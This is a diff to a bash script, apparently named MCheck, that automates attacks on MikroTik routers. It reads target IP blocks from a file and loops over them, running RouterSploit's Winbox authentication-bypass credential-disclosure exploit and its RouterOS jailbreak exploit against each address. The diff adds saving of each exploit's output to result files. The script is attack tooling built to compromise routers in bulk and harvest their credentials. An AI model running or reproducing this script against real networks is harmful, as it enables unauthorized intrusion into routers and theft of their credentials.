@@ -13,10 +13,15 @@ UPURPLE='\033[4;35m'
 UBLUE='\033[4;34m'
 URED='\033[4;31m'
 
+cd /opt/MCheck
 # Root Check
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
+fi
+if [[ ! -f '/opt/MCheck/files/tiks.txt' ]]; then
+	echo -e "${URED}Please enter an IP block in ${UBLUE}files/tiks.txt ${URED}to start scanning first${NC}"
+	exit 1
 fi
 # Tiks.txt file for RouterSploit
 if [[ -d '/opt/MCheck/files/tiks_rsf.txt' ]]; then
@@ -39,7 +44,6 @@ running(){
 }
 # Start of Mikro_Check
 mchecker(){
-	cd /opt/MCheck
 	while :
 	do
 		echo "Press <CTRL+C> to exit."
@@ -47,7 +51,7 @@ mchecker(){
 		running
 		python scripts/miko.py | tee output.log
 		SAVE=$(cat output.log)
-		echo "${SAVE}" >> Micro_Check.results
+		echo "${SAVE}" >> files/Mikro_Check.results
 		echo "==============================================================================================" >> Micro_Check.results
 		rm output.log
 	done
@@ -57,8 +61,14 @@ rsf(){
 	cd /root/routersploit
 	for name in `cat /opt/MCheck/files/tiks_rsf.txt`
 		do
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}"
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}"
+			#winbox_auth_bypass_creds_disclosure
+			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}" | tee winbox.log
+			WINSAVE=$(cat winbox.log)
+			echo "${WINSAVE}" >> files/RSF_winbox.results
+			# routeros_jailbreak
+			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}" | tee jailbreak.log
+			JAIL=$(cat jailbreak.log)
+			echo "${JAIL}" >> files/RSF_jailbreak.results
 		done
 }
 #MCheck Start
@@ -80,3 +90,5 @@ PS3='What tool would you like to use?'
 
 			esac
 		done
+	echo -e "${YLW}All results have been saved to ${UPURPLE}/opt/MCheck/files/${NC}"
+exit 0
